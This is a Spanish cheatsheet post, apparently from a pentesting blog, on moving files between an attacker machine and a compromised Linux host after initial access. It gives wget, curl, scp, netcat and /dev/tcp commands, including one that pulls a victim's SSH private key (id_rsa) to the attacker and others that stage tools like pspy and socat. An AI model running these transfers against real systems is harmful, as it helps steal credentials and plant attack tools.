---
title: "Transferir Archivos (Linux)"
date: 2024-10-20 00:00:00 +0800
categories: cheatsheets
tags: privesc
description: Formas de transferirnos los archivos a nuestra máquina atacante a través de la máquina víctima y viceversa en Linux.
---

## Definición

Cuando hemos ganado acceso a la máquina víctima es posible que llegue el momento en cual debemos transferirnos archivos a la máquina víctima para aplicar un mayor reconocimiento dentro de esta y así poder aplicar Técnicas de escala de privilegios (Linux), para que dicho proceso de Transferencia sea más sencillo he creado el siguiente recurso el cual recoge los principales métodos de transferencia para máquina Linux.
> 
> *Accediendo al siguiente recurso podemos encontrar de forma más información sobre las transferencias de archivos <a href="https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/" target="_blank">IronHackers</a>*.

___
## Tipos

> *Cuando no se especifique el caso del **Atacante** será porque se puede hacer con un simple servidor **HTTP**, ya sea con **python**, **php** o de cualquier otra forma. Véase <a href="#">Servidores HTTP</a>.*

### Wget
#### Víctima

```bash
wget http://<direcciónIP>/<recurso>
```

___
### Curl
#### Víctima

> Estaremos añadiendo el parámetro `-O` para cuando queremos mantener el nombre del archivo, y añadiremos una `-o` para cuando queramos cambiarle el nombre

```bash
curl http://<direcciónIP>/<recurso> -O
curl http://<direcciónIP>/<recurso> -o <nombrepersonalizado>
```

___
### SCP

> *Para este caso debemos de tener acceso a la máquina a través del servicio **SSH**.*

#### Atacante

```bash
scp /home/terror/Descargas/socat juan@172.17.0.2:/tmp
```

> *En el caso particular que queremos descargarnos a nuestra máquina de atacante un archivo de la máquina víctima usando SCP podemos hacer:*

```bash
scp juan@172.17.0.2:/home/juan/.ssh/id_rsa
```

____
### /dev/tcp
#### Atacante

```bash
nc -nlvp 443 < pspy
```

#### Víctima

```bash
cat < /dev/tcp/192.168.18.10/443 > pspy
```

![Pasted image 20240826192540.png](<../assets/images/posts/2024-10-20-transferirarchivos/Pasted image 20240826192540.png>)

___
### base64
#### Víctima

```bash
echo -n "QmVuIHNpc3RlbWEgZGUgbnVtZXJhY2nzbiBwbpY2lvbmFsIHF1ZSB1c2ENjQgY2tbyBiYXNLiYXlvciBwb3RlbmNpYSBxdWUgcHVlZGUgc2VyIHJlcHJlc2VudGFkYSB1c2FuZG8g+m5pY2Ft"; echo | base64 -d
```

___
### NetCat
#### Atacante

```bash
nc 172.17.0.2 443 < /home/terror/Descargas/socat
```
#### Víctima

```bash
nc -nvlp 443 > socat
```

___
## Comprobar integridad con md5sum

> Gracias al comando `md5sum` podemos comprobar la integridad de los archivos transferidos y saber si se han corrompido durante dicha Transferencia.

```bash
md5sum <nombrearchivo>
```


![Pasted image 20240826192602.png](<../assets/images/posts/2024-10-20-transferirarchivos/Pasted image 20240826192602.png>)